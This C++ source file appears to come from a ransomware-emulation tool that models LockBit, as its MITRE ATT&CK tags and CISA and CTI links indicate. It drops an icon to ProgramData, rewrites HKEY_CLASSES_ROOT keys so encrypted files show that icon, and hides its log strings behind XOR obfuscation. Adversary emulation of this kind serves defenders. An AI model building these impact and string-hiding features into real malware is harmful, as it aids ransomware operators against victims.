#include "crypto/xor_obfuscation.hpp"
#include "impact.hpp"
#include "logger.hpp"
#include "registry.hpp"
#include "resource.hpp"
#include "util/os_util.hpp"
#include "util/resource_util.hpp"
#include "util/string_util.hpp"

namespace impact {

// Drops specified resource to the Program Data folder using the specified destination file name.
// Will throw exception on non-recoverable error
void DropResourceToProgramData(int resource_id, LPCWSTR dest_file_name) {
    std::filesystem::path icon_path = os_util::GetProgramDataPath();
    icon_path.append(dest_file_name);
    resource_util::WriteResourceToDisk(resource_id, icon_path.wstring().c_str());
    XorLogger::LogDebug(std::format("{} {} to path {}", XOR_LIT("Wrote resource ID"), resource_id, icon_path.string()));
}

// Drops icon resource to the Program Data folder using the specified destination file name.
// Returns true on success, false on failure.
bool DropIconFile(LPCWSTR file_name) {
    try {
        DropResourceToProgramData(ICON_RESOURCE_ID, file_name);
    } catch (std::exception& e) {
        XorLogger::LogError(std::format("{}: {}", XOR_LIT("Failed to drop icon resource to ProgramData folder"), e.what()));
        return false;
    } catch (...) {
        XorLogger::LogError(XOR_LIT("Unknown exception when dropping icon resource to ProgramData folder."));
        return false;
    }
    return true;
}

/*
 * SetEncryptedFileIcon:
 *      About:
 *          Drops the file icon resource to disk at %PROGRAMDATA%\<extension>.ico (C:\ProgramData\ on most machines),
 *          and sets the icon for .<extension> files to that image by performing the following registry edits:
 *              - Creates key HKCR\.<extension> and sets its default value to <extension>
 *              - Creates key HKCR\<extension>\DefaultIcon and sets its default value to C:\ProgramData\<extension>.ico
 *          CreateFileW and WriteFile API calls are used to save the icon file to disk.
 *          RegCreateKeyExW RegSetValueExW API calls are used to perform the registry edits.
 *      Result:
 *          - Icon file written to disk at %PROGRAMDATA%\<extension>.ico
 *          - Registry key HKCR\.<extension> created with default value set to <extension>
 *          - Registry key HKCR\<extension>\DefaultIcon created with default value set to C:\ProgramData\<extension>.ico
 *      Returns:
 *          True upon success, false upon failure
 *      MITRE ATT&CK Techniques:
 *          T1112: Modify Registry
 *          T1106: Native API
 *      CTI:
 *          https://www.antiy.net/p/analysis-of-lockbit-ransomware-samples-and-considerations-for-defense-against-targeted-ransomware/
 *          https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a
 *          https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a
 */
bool SetEncryptedFileIcon(const std::wstring& extension) {
    std::wstring file_name = extension + XOR_WIDE_LIT(L".ico");
    std::string ext_str = string_util::wstring_to_string(extension);
    std::wstring icon_path = os_util::GetProgramDataPath().wstring() + L"\\" + file_name;
    if (!DropIconFile(file_name.c_str())) {
        return false;
    }
    XorLogger::LogDebug(std::format("{} {}.", XOR_LIT("Saved icon resource at"), string_util::wstring_to_string(icon_path)));

    // Set default value of HKCR\.<extension> to the extension itself
    if (!registry::WriteRegistry(HKEY_CLASSES_ROOT, std::wstring(L".") + extension, L"", extension)) {
        XorLogger::LogError(std::format("{}{}", XOR_LIT("Failed to set default value for icon registry key HKCR\\."), ext_str));
        return false;
    } else {
        XorLogger::LogDebug(std::format("{}{}", XOR_LIT("Set default value for icon registry key HKCR\\."), ext_str));
    }

    // Set default value of HKCR\<extension>\DefaultIcon to extension file path
    if (!registry::WriteRegistry(HKEY_CLASSES_ROOT, extension + XOR_WIDE_LIT(L"\\DefaultIcon"), L"", icon_path)) {
        XorLogger::LogError(std::format("{}{}{}", XOR_LIT("Failed to set icon path for icon registry key HKCR\\"), ext_str, XOR_LIT("\\DefaultIcon")));
        return false;
    } else {
        XorLogger::LogDebug(std::format("{}{}{}", XOR_LIT("Set icon path for icon registry key HKCR\\"), ext_str, XOR_LIT("\\DefaultIcon")));
        return true;
    }
}

} // namespace